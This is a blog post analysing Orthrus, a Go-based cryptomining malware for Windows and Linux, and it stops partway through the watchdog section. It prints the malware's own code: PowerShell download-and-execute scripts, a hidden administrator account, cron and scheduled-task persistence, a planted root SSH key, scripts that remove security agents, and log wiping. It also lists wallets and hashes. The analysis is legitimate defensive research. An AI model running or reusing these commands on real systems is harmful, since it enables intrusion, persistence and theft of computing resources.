<!DOCTYPE html>
<html lang="en">

  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <meta name="author" content="Joakim Kennedy">
    <meta name="description" content="A place I share my thoughts and play with stuff">
    <meta name="keywords" content="blog,developer,hacks,security,malware">

    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Go Under the Hood: Orthrus"/>
<meta name="twitter:description" content="Orthrus is a crypto-mining malware targeting both Windows and Linux machines. It&#39;s written in Go and uses the Ethereum blockchain to prevent take-down."/>

    <meta property="og:title" content="Go Under the Hood: Orthrus" />
<meta property="og:description" content="Orthrus is a crypto-mining malware targeting both Windows and Linux machines. It&#39;s written in Go and uses the Ethereum blockchain to prevent take-down." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/go-under-the-hood-orthrus/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-03-23T18:00:00+00:00" />
<meta property="article:modified_time" content="2020-03-23T18:00:00+00:00" />



    
      <base href="../../posts/go-under-the-hood-orthrus/">
    
    <title>
  Go Under the Hood: Orthrus · Playhouse
</title>

    
      <link rel="canonical" href="../../posts/go-under-the-hood-orthrus/">
    

    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700" rel="stylesheet">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />

    
      
      
      <link rel="stylesheet" href="../../css/coder.min.28d751104f30c16da1aa1bb04015cbe662cacfe0d1b01af4f2240ad58580069c.css" integrity="sha256-KNdREE8wwW2hqhuwQBXL5mLKz&#43;DRsBr08iQK1YWABpw=" crossorigin="anonymous" media="screen" />
    

    

    

    

    
    
    <link rel="icon" type="image/png" href="../../images/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="../../images/favicon-16x16.png" sizes="16x16">

    <meta name="generator" content="Hugo 0.88.1" />
  </head>

  <body class=" ">
    <main class="wrapper">
      <nav class="navigation">
  <section class="container">
    <a class="navigation-title" href="../../">
      Playhouse
    </a>
    <input type="checkbox" id="menu-toggle" />
    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
    <ul class="navigation-list">
      
        
          <li class="navigation-item">
            <a class="navigation-link" href="../../posts/">Blog</a>
          </li>
        
          <li class="navigation-item">
            <a class="navigation-link" href="https://go-re.tk">Go Reverse Engineering Tool Kit</a>
          </li>
        
      
      
    </ul>
  </section>
</nav>


      <div class="content">
        
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">Go Under the Hood: Orthrus</h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fas fa-calendar"></i>
              <time datetime='2020-03-23T18:00:00Z'>
                March 23, 2020
              </time>
            </span>
            <span class="reading-time">
              <i class="fas fa-clock"></i>
              33 minutes read
            </span>
          </div>
          
          <div class="tags">
  <i class="fas fa-tag"></i>
    <a href="../../tags/go/">go</a>
      <span class="separator">•</span>
    <a href="../../tags/malware/">malware</a>
      <span class="separator">•</span>
    <a href="../../tags/mining/">mining</a>
      <span class="separator">•</span>
    <a href="../../tags/go_under_the_hood/">go_under_the_hood</a></div>

        </div>
      </header>

      <div>
        <p><img src="../../images/orthrus.jpg" alt="Orthrus_image"></p>
<p>Orthrus is a crypto-mining malware targeting both <em>Windows</em> and <em>Linux</em>
machines.  One of the first analyses of the <em>Linux</em> version of the malware was
published by
<a href="https://www.antiy.cn/research/notice&amp;report/research_report/20190625.html">Antiy</a>
in June 2019. Since then, the threat actor has evolved the malware to also
infect <em>Windows</em> servers. Orthrus is made up of four different modules written
in <em>Powershell</em>, <em>shell</em> script, and binary executables. The binary executables
are written in <em>Go</em> (<em>Golang</em>) and the <em>Linux</em> and <em>Windows</em> versions or
compiled from the same source code.</p>
<p>The four modules of the malware are a script to download and set up all the
modules, a crypto-miner, a watchdog module, and a scanner. The watchdog module
ensures all the other modules are running while the scanner scans the internet
for other machines to infect. The way the malware spreads is through exploiting
unpatched services and the use of weak credentials. If scanner managing to
compromise the machine, it executes to script module to set up the infection.</p>
<h1 id="the-setup">The Setup</h1>
<p>The initial infections start with the execution of a <em>Powershell</em> script on
<em>Windows</em> and a <em>shell</em> script on <em>Linux</em>. The purpose of this script is to
download other parts of the malware and execute them.</p>
<p>The <em>Powershell</em> script uses <em>.NET&rsquo;s</em> <em>WebClient</em> to download the files.  The
function of performing the downloading is shown below. If the first <em>URL</em>
fails, it tries to use a backup URL. All the <em>URLs</em> are included as variables
in the script file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ps1" data-lang="ps1"><span style="color:#66d9ef">function</span> Update($url,$backup_url,$path,$proc_name)
 {        
    Get-Process -Name $proc_name | Stop-Process
    Remove-Item $path
    <span style="color:#66d9ef">Try</span> {
        $vc = New-Object System.Net.WebClient
        $vc.DownloadFile($url,$path)
    }
    <span style="color:#66d9ef">Catch</span> {
        Write-Output <span style="color:#e6db74">&#34;donwload with backurl&#34;</span>
        $vc = New-Object System.Net.WebClient
        $vc.DownloadFile($backup_url,$path)
    }
}
</code></pre></div><p>The script checks if the files exist and that the file size is correct.  The
code snippet below shows the code for downloading all the parts. The comments
are provided by the author of the code.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ps1" data-lang="ps1"><span style="color:#75715e">#miner_path</span>
<span style="color:#66d9ef">if</span>((Test-Path $miner_path))
{
    Write-Output <span style="color:#e6db74">&#34;miner file exist&#34;</span>
    <span style="color:#66d9ef">if</span>((Get-Item $miner_path).length <span style="color:#f92672">-ne</span> $miner_size)
    {
        Update $miner_url $miner_url_backup $miner_path $miner_name
    }
}
<span style="color:#66d9ef">else</span> {
    Update $miner_url $miner_url_backup $miner_path $miner_name
}
<span style="color:#75715e">#miner_cfg_path</span>
<span style="color:#66d9ef">if</span>((Test-Path $miner_cfg_path))
{
    Write-Output <span style="color:#e6db74">&#34;miner_cfg file exist&#34;</span>
    <span style="color:#66d9ef">if</span>((Get-Item $miner_cfg_path).length <span style="color:#f92672">-ne</span> $miner_cfg_size)
    {
        Update $miner_cfg_url $miner_cfg_url_backup $miner_cfg_path $miner_cfg_name
    }
}
<span style="color:#66d9ef">else</span> {
    Update $miner_cfg_url $miner_cfg_url_backup $miner_cfg_path $miner_cfg_name
}
<span style="color:#75715e">#scan_path</span>
<span style="color:#66d9ef">if</span>((Test-Path $scan_path))
{
    Write-Output <span style="color:#e6db74">&#34;scan file exist&#34;</span>
    <span style="color:#66d9ef">if</span>((Get-Item $scan_path).length <span style="color:#f92672">-ne</span> $scan_size)
    {
        Update $scan_url $scan_url_backup $scan_path $scan_name
    }
}
<span style="color:#66d9ef">else</span> {
    Update $scan_url $scan_url_backup $scan_path $scan_name
}
<span style="color:#75715e">#dog_path</span>
<span style="color:#66d9ef">if</span>((Test-Path $watchdog_path))
{
    Write-Output <span style="color:#e6db74">&#34;watchdog file exist&#34;</span>
    <span style="color:#66d9ef">if</span>((Get-Item $watchdog_path).length <span style="color:#f92672">-ne</span> $watchdog_size)
    {
        Update $watchdog_url $watchdog_url_backup $watchdog_path $watchdog_name
    }
}
<span style="color:#66d9ef">else</span> {
    Update $watchdog_url $watchdog_url_backup $watchdog_path $watchdog_name
}
<span style="color:#75715e">#clean.bat</span>
<span style="color:#66d9ef">if</span>((Test-Path $killmodule_path))
{
    Remove-Item $killmodule_path
	Update $killmodule_url $killmodule_url_backup $killmodule_path $killmodule_name
}
<span style="color:#66d9ef">else</span> {
    Update $killmodule_url $killmodule_url_backup $killmodule_path $killmodule_name
}

Remove-Item $payload_path
Remove-Item $HOME\update.ps1
<span style="color:#66d9ef">Try</span> {
    $vc = New-Object System.Net.WebClient
    $vc.DownloadFile($payload_url,$payload_path)
}
<span style="color:#66d9ef">Catch</span> {
    Write-Output <span style="color:#e6db74">&#34;download with backurl&#34;</span>
    $vc = New-Object System.Net.WebClient
    $vc.DownloadFile($payload_url_backup,$payload_path)
}
echo F | xcopy /y $payload_path $HOME\update.ps1
</code></pre></div><p>The script adds persistence via a scheduled task with the command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ps1" data-lang="ps1">SchTasks.exe /Create /SC MINUTE /TN <span style="color:#e6db74">&#34;Update service for Windows Service&#34;</span> /TR <span style="color:#e6db74">&#34;PowerShell.exe -ExecutionPolicy bypass -windowstyle hidden -File $HOME\update.ps1&#34;</span> /MO 30 /F
</code></pre></div><p>After the <em>miner</em>, <em>scanner</em>, and <em>watchdog</em> processes have been started, a
<em>kill module</em> is executed. This module is a <em>batch</em> file that is being
executed.  The batch file&rsquo;s content has changed throughout different campaigns.
The snippet below shows the content of older campaigns, where a blocking rule
is added to the firewall.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-batch" data-lang="batch">netsh advfirewall firewall add rule name=<span style="color:#e6db74">&#34;ipcesi&#34;</span> dir=out action=block remoteip=<span style="color:#e6db74">&#34;43.245.222.57/32&#34;</span>
</code></pre></div><p>In the current campaign, the malware adds a new account on the machine with the
code snippet shown below.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-batch" data-lang="batch"><span style="color:#66d9ef">echo</span> off
net user sqlbackup P@ssword098 /add
net localgroup administrators sqlbackup /add
</code></pre></div><p>The shell script used on infected <em>Linux</em> machines is more complex than its
<em>Powershell</em> equivalent. As with many other mining malware, it tries to kill
any other running mining processes. The script executes the commands below in
the hope to kill as many miners as possible.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">kill_miner_proc<span style="color:#f92672">()</span>
<span style="color:#f92672">{</span>
    ps auxf|grep -v grep|grep <span style="color:#e6db74">&#34;mine.moneropool.com&#34;</span>|awk <span style="color:#e6db74">&#39;{print $2}&#39;</span>|xargs kill -9
    ps auxf|grep -v grep|grep <span style="color:#e6db74">&#34;pool.t00ls.ru&#34;</span>|awk <span style="color:#e6db74">&#39;{print $2}&#39;</span>|xargs kill -9
    ps auxf|grep -v grep|grep <span style="color:#e6db74">&#34;xmr.crypto-pool.fr:8080&#34;</span>|awk <span style="color:#e6db74">&#39;{print $2}&#39;</span>|xargs kill -9
    ps auxf|grep -v grep|grep <span style="color:#e6db74">&#34;xmr.crypto-pool.fr:3333&#34;</span>|awk <span style="color:#e6db74">&#39;{print $2}&#39;</span>|xargs kill -9
    ps auxf|grep -v grep|grep <span style="color:#e6db74">&#34;zhuabcn@yahoo.com&#34;</span>|awk <span style="color:#e6db74">&#39;{print $2}&#39;</span>|xargs kill -9
    ps auxf|grep -v grep|grep <span style="color:#e6db74">&#34;monerohash.com&#34;</span>|awk <span style="color:#e6db74">&#39;{print $2}&#39;</span>|xargs kill -9
    ps auxf|grep -v grep|grep <span style="color:#e6db74">&#34;/tmp/a7b104c270&#34;</span>|awk <span style="color:#e6db74">&#39;{print $2}&#39;</span>|xargs kill -9
    ps auxf|grep -v grep|grep <span style="color:#e6db74">&#34;xmr.crypto-pool.fr:6666&#34;</span>|awk <span style="color:#e6db74">&#39;{print $2}&#39;</span>|xargs kill -9
    ps auxf|grep -v grep|grep <span style="color:#e6db74">&#34;xmr.crypto-pool.fr:7777&#34;</span>|awk <span style="color:#e6db74">&#39;{print $2}&#39;</span>|xargs kill -9
    ps auxf|grep -v grep|grep <span style="color:#e6db74">&#34;xmr.crypto-pool.fr:443&#34;</span>|awk <span style="color:#e6db74">&#39;{print $2}&#39;</span>|xargs kill -9
    ps auxf|grep -v grep|grep <span style="color:#e6db74">&#34;stratum.f2pool.com:8888&#34;</span>|awk <span style="color:#e6db74">&#39;{print $2}&#39;</span>|xargs kill -9
    ps auxf|grep -v grep|grep <span style="color:#e6db74">&#34;xmrpool.eu&#34;</span> | awk <span style="color:#e6db74">&#39;{print $2}&#39;</span>|xargs kill -9
    ps auxf|grep xiaoyao| awk <span style="color:#e6db74">&#39;{print $2}&#39;</span>|xargs kill -9
    ps auxf|grep xiaoxue| awk <span style="color:#e6db74">&#39;{print $2}&#39;</span>|xargs kill -9
    ps ax|grep var|grep lib|grep jenkins|grep -v httpPort|grep -v headless|grep <span style="color:#e6db74">&#34;\-c&#34;</span>|xargs kill -9
    ps ax|grep -o <span style="color:#e6db74">&#39;./[0-9]* -c&#39;</span>| xargs pkill -f
    pkill -f biosetjenkins
    pkill -f Loopback
    pkill -f apaceha
    pkill -f cryptonight
    pkill -f stratum
    pkill -f mixnerdx
    pkill -f performedl
    pkill -f JnKihGjn
    pkill -f irqba2anc1
    pkill -f irqba5xnc1
    pkill -f irqbnc1
    pkill -f ir29xc1
    pkill -f conns
    pkill -f irqbalance
    pkill -f crypto-pool
    pkill -f minexmr
    pkill -f XJnRj
    pkill -f mgwsl
    pkill -f pythno
    pkill -f jweri
    pkill -f lx26
    pkill -f NXLAi
    pkill -f BI5zj
    pkill -f askdljlqw
    pkill -f minerd
    pkill -f minergate
    pkill -f Guard.sh
    pkill -f ysaydh
    pkill -f bonns
    pkill -f donns
    pkill -f kxjd
    pkill -f Duck.sh
    pkill -f bonn.sh
    pkill -f conn.sh
    pkill -f kworker34
    pkill -f kw.sh
    pkill -f pro.sh
    pkill -f polkitd
    pkill -f acpid
    pkill -f icb5o
    pkill -f nopxi
    pkill -f irqbalanc1
    pkill -f minerd
    pkill -f i586
    pkill -f gddr
    pkill -f mstxmr
    pkill -f ddg.2011
    pkill -f wnTKYg
    pkill -f deamon
    pkill -f disk_genius
    pkill -f sourplum
    pkill -f polkitd
    pkill -f nanoWatch
    pkill -f zigw
    pkill -f devtool
    pkill -f systemctI
    pkill -f WmiPrwSe
	    pkill -f sysguard
		    pkill -f sysupdate
			    pkill -f networkservice
    crontab -r
    rm -rf /var/spool/cron/*
<span style="color:#f92672">}</span>
</code></pre></div><p>The script also kills suspicious processes with the function shown below.  The
function will kill all the processes executed from the <code>/tmp</code> directory or has
a high <em>CPU</em> usage. Processes with the malware&rsquo;s module filenames are skipped.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">kill_sus_proc<span style="color:#f92672">()</span>
<span style="color:#f92672">{</span>
    ps axf -o <span style="color:#e6db74">&#34;pid&#34;</span>|<span style="color:#66d9ef">while</span> read procid
    <span style="color:#66d9ef">do</span>
            ls -l /proc/$procid/exe | grep /tmp
            <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> $? -ne <span style="color:#ae81ff">1</span> <span style="color:#f92672">]</span>
            <span style="color:#66d9ef">then</span>
                    cat /proc/$procid/cmdline| grep -a -E <span style="color:#e6db74">&#34;sysguard|update.sh|sysupdate|networkservice&#34;</span>
                    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> $? -ne <span style="color:#ae81ff">0</span> <span style="color:#f92672">]</span>
                    <span style="color:#66d9ef">then</span>
                            kill -9 $procid
                    <span style="color:#66d9ef">else</span>
                            echo <span style="color:#e6db74">&#34;don&#39;t kill&#34;</span>
                    <span style="color:#66d9ef">fi</span>
            <span style="color:#66d9ef">fi</span>
    <span style="color:#66d9ef">done</span>
    ps axf -o <span style="color:#e6db74">&#34;pid %cpu&#34;</span> | awk <span style="color:#e6db74">&#39;{if($2&gt;=40.0) print $1}&#39;</span> | <span style="color:#66d9ef">while</span> read procid
    <span style="color:#66d9ef">do</span>
            cat /proc/$procid/cmdline| grep -a -E <span style="color:#e6db74">&#34;sysguard|update.sh|sysupdate|networkservice&#34;</span>
            <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> $? -ne <span style="color:#ae81ff">0</span> <span style="color:#f92672">]</span>
            <span style="color:#66d9ef">then</span>
                    kill -9 $procid
            <span style="color:#66d9ef">else</span>
                    echo <span style="color:#e6db74">&#34;don&#39;t kill&#34;</span>
            <span style="color:#66d9ef">fi</span>
    <span style="color:#66d9ef">done</span>
<span style="color:#f92672">}</span>
</code></pre></div><p>To ensure the malware&rsquo;s activity on the infected machine isn&rsquo;t inhibited, the
script tries to disable <em>SELINUX</em> and flush any cached memory. This is shown in
the code below.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">echo SELINUX<span style="color:#f92672">=</span>disabled &gt; /etc/sysconfig/selinux 2&gt;/dev/null
sync <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#ae81ff">3</span> &gt;/proc/sys/vm/drop_caches
</code></pre></div><p>The script tries to rename the binaries for both <code>curl</code> and <code>wget</code>. This is
shown in the snippet below. This prevents other actors from also infecting the
machine since the applications usually used for downloading and executing
setup scripts have a different name.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">bbdir<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/usr/bin/curl&#34;</span>
bbdira<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/usr/bin/cur&#34;</span>
ccdir<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/usr/bin/wget&#34;</span>
ccdira<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/usr/bin/wge&#34;</span>
mv /usr/bin/wget /usr/bin/get
mv /usr/bin/xget /usr/bin/get
mv /usr/bin/get /usr/bin/wge
mv /usr/bin/curl /usr/bin/url
mv /usr/bin/xurl /usr/bin/url
mv /usr/bin/url /usr/bin/cur
</code></pre></div><p>Older versions of the script also include the code shown below to uninstall
Alibaba Cloud agents and Tencent Cloud agents if they are installed.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#66d9ef">if</span> ps aux | grep -i <span style="color:#e6db74">&#39;[a]liyun&#39;</span>; <span style="color:#66d9ef">then</span>
  $bbdir http://update.aegis.aliyun.com/download/uninstall.sh | bash
  $bbdir http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
  $bbdira http://update.aegis.aliyun.com/download/uninstall.sh | bash
  $bbdira http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
  pkill aliyun-service
  rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
  rm -rf /usr/local/aegis*
  systemctl stop aliyun.service
  systemctl disable aliyun.service
  service bcm-agent stop
  yum remove bcm-agent -y
  apt-get remove bcm-agent -y
<span style="color:#66d9ef">elif</span> ps aux | grep -i <span style="color:#e6db74">&#39;[y]unjing&#39;</span>; <span style="color:#66d9ef">then</span>
  /usr/local/qcloud/stargate/admin/uninstall.sh
  /usr/local/qcloud/YunJing/uninst.sh
  /usr/local/qcloud/monitor/barad/admin/uninstall.sh
<span style="color:#66d9ef">fi</span>
</code></pre></div><p>For persistence, the malware uses cron jobs. The script adds the following
cron entry if it&rsquo;s running as root:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">echo <span style="color:#e6db74">&#34;*/30 * * * * sh /etc/update.sh &gt;/dev/null 2&gt;&amp;1&#34;</span> &gt;&gt; <span style="color:#e6db74">${</span>crondir<span style="color:#e6db74">}</span>
</code></pre></div><p>If it doesn&rsquo;t run as root, the following cron entry is added:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">echo <span style="color:#e6db74">&#34;*/30 * * * * sh /tmp/update.sh &gt;/dev/null 2&gt;&amp;1&#34;</span> &gt;&gt; <span style="color:#e6db74">${</span>crondir<span style="color:#e6db74">}</span>
</code></pre></div><p>Older versions of the script also would add an <em>ssh</em> key to the <code>authorized_keys</code>
for root via the following code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">chmod <span style="color:#ae81ff">700</span> /root/.ssh/
echo &gt;&gt; /root/.ssh/authorized_keys
chmod <span style="color:#ae81ff">600</span> root/.ssh/authorized_keys
echo <span style="color:#e6db74">&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9WKiJ7yQ6HcafmwzDMv1RKxPdJI/oeXUWDNW1MrWiQNvKeSeSSdZ6NaYVqfSJgXUSgiQbktTo8Fhv43R9FWDvVhSrwPoFBz9SAfgO06jc0M2kGVNS9J2sLJdUB9u1KxY5IOzqG4QTgZ6LP2UUWLG7TGMpkbK7z6G8HAZx7u3l5+Vc82dKtI0zb/ohYSBb7pK/2QFeVa22L+4IDrEXmlv3mOvyH5DwCh3HcHjtDPrAhFqGVyFZBsRZbQVlrPfsxXH2bOLc1PMrK1oG8dyk8gY8m4iZfr9ZDGxs4gAqdWtBQNIN8cvz4SI+Jv9fvayMH7f+Kl2yXiHN5oD9BVTkdIWX root@u17&#34;</span> &gt;&gt; /root/.ssh/authorized_keys
</code></pre></div><p>The main goal with the script is to download and start other parts of the
malware.  The script downloads four files: the miner, the configuration file
for the miner, the watchdog component, and the scanner component. The table
below shows where the files are placed by the script based on the permissions
it has.</p>
<table>
<thead>
<tr>
<th>Type of file</th>
<th>Root path</th>
<th>User path</th>
</tr>
</thead>
<tbody>
<tr>
<td>Miner config</td>
<td>/etc/config.json</td>
<td>/tmp/config.json</td>
</tr>
<tr>
<td>Monero miner</td>
<td>/etc/sysupdate</td>
<td>/tmp/sysupdate</td>
</tr>
<tr>
<td>Watchdog</td>
<td>/etc/sysguard</td>
<td>/tmp/sysguard</td>
</tr>
<tr>
<td>Scanner</td>
<td>/etc/networkservice</td>
<td>/tmp/networkservice</td>
</tr>
</tbody>
</table>
<p>Finally, the malware rewrites the <code>iptables</code> rules and clears some logs, as can
be seen below. The blocked ports are commonly used by mining pools.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">iptables -F
iptables -X
iptables -A OUTPUT -p tcp --dport <span style="color:#ae81ff">3333</span> -j DROP
iptables -A OUTPUT -p tcp --dport <span style="color:#ae81ff">5555</span> -j DROP
iptables -A OUTPUT -p tcp --dport <span style="color:#ae81ff">7777</span> -j DROP
iptables -A OUTPUT -p tcp --dport <span style="color:#ae81ff">9999</span> -j DROP
iptables -I INPUT -s 43.245.222.57 -j DROP
service iptables reload
ps auxf|grep -v grep|grep <span style="color:#e6db74">&#34;stratum&#34;</span>|awk <span style="color:#e6db74">&#39;{print $2}&#39;</span>|xargs kill -9
history -c
echo &gt; /var/spool/mail/root
echo &gt; /var/log/wtmp
echo &gt; /var/log/secure
echo &gt; /root/.bash_history
</code></pre></div><h1 id="mining-for-gold">Mining for Gold</h1>
<p>The miner installed by the setup script is XMRig and it is used for mining
Monero.  In the most recent binaries, the threat actor has changed the internal
name of the project to a name that is more likely to be found on the infected
machine. For example, the miner for <em>Linux</em> has an internal name of <em>screen</em>
with a file version of <em>2.8.5</em> while the miner for <em>Windows</em> has the internal
name of <em>jusched</em> with the same version as the <em>Linux</em> miner. The table below
lists the miners with their <em>filename</em> and <em>SHA-256</em> hash.</p>
<table>
<thead>
<tr>
<th>Filename</th>
<th>SHA-256</th>
<th>Note</th>
</tr>
</thead>
<tbody>
<tr>
<td>sysupdata</td>
<td>c51811c6d68b219d7804407ea54bd1f9b8ae0a4fcf1ddf6126740812bea52416</td>
<td>XMRig 5.6.0</td>
</tr>
<tr>
<td>sysupdata</td>
<td>e7446d595854b6bac01420378176d1193070ef776788af12300eb77e0a397bf7</td>
<td>XMRig (Fake name &ldquo;screen 2.8.5&rdquo;)</td>
</tr>
<tr>
<td>sysupdate.exe</td>
<td>559a8ff34cf807e508d32e3a28864c687263587fe4ffdcefe3f462a7072dcc74</td>
<td>XMRIG (Fake name &ldquo;jusched 2.8.5&rdquo;)</td>
</tr>
<tr>
<td>sysupdate.exe</td>
<td>e0a44f98e994ab0cdd88cacb803668903a302a83761e6376b80264364f6c5a9a</td>
<td>XMRig 5.6.0</td>
</tr>
</tbody>
</table>
<p>The <em>wallet address</em> and the mining pools used by the threat actor are listed
in the table below.</p>
<table>
<thead>
<tr>
<th>Pool</th>
<th>Wallet/User</th>
</tr>
</thead>
<tbody>
<tr>
<td>xmr.f2pool.com:13531</td>
<td>43zqYTWj1JG1H1idZFQWwJZLTos3hbJ5iR3tJpEtwEi43UBbzPeaQxCRysdjYTtdc8aHao7csiWa5BTP9PfNYzyfSbbrwoR</td>
</tr>
<tr>
<td>randomxmonero.hk.nicehash.com:3380</td>
<td>3HVQkSGfvyyQ8ACpShBhegoKGLuTCMCiAr</td>
</tr>
<tr>
<td>xmr-eu2.nanopool.org:14444</td>
<td>43zqYTWj1JG1H1idZFQWwJZLTos3hbJ5iR3tJpEtwEi43UBbzPeaQxCRysdjYTtdc8aHao7csiWa5BTP9PfNYzyfSbbrwoR</td>
</tr>
</tbody>
</table>
<h1 id="watchdog-component">Watchdog component</h1>
<p>The watchdog component is written in Go. An extracted source code structure is
shown below. From the function names, it suggests that the code base is shared
between both the Linux version and the Windows version of the malware. A deeper
analysis of the samples confirms that the watchdog for <em>Linux</em> and <em>Windows</em>
shares the same codebase.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Package _/tmp/0324/dog/cc: /tmp/0324/dog/cc
File: &lt;autogenerated&gt;	
	init Lines: 1 to 29 (28)	
File: get_newcc.go	
	exactcc Lines: 13 to 26 (13)	
	getdata Lines: 26 to 90 (64)	
	Get_new_cc Lines: 90 to 94 (4)	
File: get_target.go	
	get_target Lines: 30 to 123 (93)	
	Get_tasks_payload Lines: 123 to 135 (12)	
	Get_miner_path Lines: 135 to 151 (16)	
	Get_miner_conf_path Lines: 151 to 167 (16)	
	Get_scan_path Lines: 167 to 190 (23)	
	Get_ps_path Lines: 190 to 208 (18)	
	Get_dg_path Lines: 208 to 225 (17)	
	Get_payload Lines: 225 to 232 (7)	
	Get_conf Lines: 232 to 243 (11)	
	Format_newcc Lines: 243 to 250 (7)	
	Set_newcc Lines: 250 to 269 (19)	
	Check_cc Lines: 269 to 311 (42)	
	Check_ccfunc1 Lines: 282 to 363 (81)	
	Get_win_powershell_command_by_cc Lines: 311 to 322 (11)	
	Init_cc Lines: 322 to 349 (27)	
	Debug_cc_logput Lines: 349 to 357 (8)	
	Debug_cc_logputfunc1 Lines: 363 to 370 (7)	
File: utils.go	
	Http_GetData Lines: 16 to 60 (44)	
	Http_GetDatafunc1 Lines: 27 to 34 (7)	
	Calc_file_md5 Lines: 60 to 71 (11)	
	Encode_powershell Lines: 71 to 282 (211)	
Package main: /tmp/0324/dog
File: &lt;autogenerated&gt;	
	init Lines: 1 to 1 (0)	
File: watchdog.go	
	dog_protect_process_thread Lines: 18 to 41 (23)	
	dog_protect_cron_thread Lines: 41 to 70 (29)	
	dog_update_thread Lines: 70 to 92 (22)	
	dog_protect_cc_thread Lines: 92 to 168 (76)	
	getcurrentsystem Lines: 168 to 188 (20)	
	getisroot Lines: 188 to 226 (38)	
	start_dog Lines: 226 to 240 (14)	
	main Lines: 240 to 248 (8)	
Package _/tmp/0324/dog/platform: /tmp/0324/dog/platform
File: &lt;autogenerated&gt;	
	init Lines: 1 to 18 (17)	
File: entry_opeartion.go	
	Download_payload_and_exec Lines: 11 to 18 (7)	
	Walk_cron_tasks Lines: 18 to 32 (14)	
	Walk_process Lines: 32 to 49 (17)	
	Update_file Lines: 49 to 172 (123)	
	update_file_checkmd5 Lines: 172 to 197 (25)	
	download_payload_and_exec Lines: 197 to 199 (2)	
File: lin_opeartion.go	
	lin_get_command_base Lines: 16 to 41 (25)	
	lin_os_command_exec Lines: 41 to 87 (46)	
	lin_walk_cron Lines: 87 to 136 (49)	
	lin_walk_process Lines: 136 to 178 (42)	
	lin_download_payload_and_exec Lines: 178 to 205 (27)	
	lin_start_miner Lines: 205 to 223 (18)	
	lin_start_scan Lines: 223 to 239 (16)	
	Linux_init Lines: 239 to 241 (2)	
File: win_opeartion.go	
	win_os_command_exec Lines: 16 to 49 (33)	
	win_download_payload_and_exec Lines: 49 to 61 (12)	
	win_walk_schtasks Lines: 61 to 184 (123)	
	win_walk_cron Lines: 184 to 199 (15)	
	win_walk_process Lines: 199 to 239 (40)	
	win_start_miner Lines: 239 to 255 (16)	
	win_start_scan Lines: 255 to 265 (10)	
</code></pre></div><h2 id="the-main-function">The Main Function</h2>
<p>The main function does some information gathering about the host it has
infected. It determines at what permission level the user has and sends that
information back to the C2 server. For example, it sends <code>iam-lin-root</code> if the
machine runs Linux and has <em>root</em> permissions. Other values it can send are:</p>
<ul>
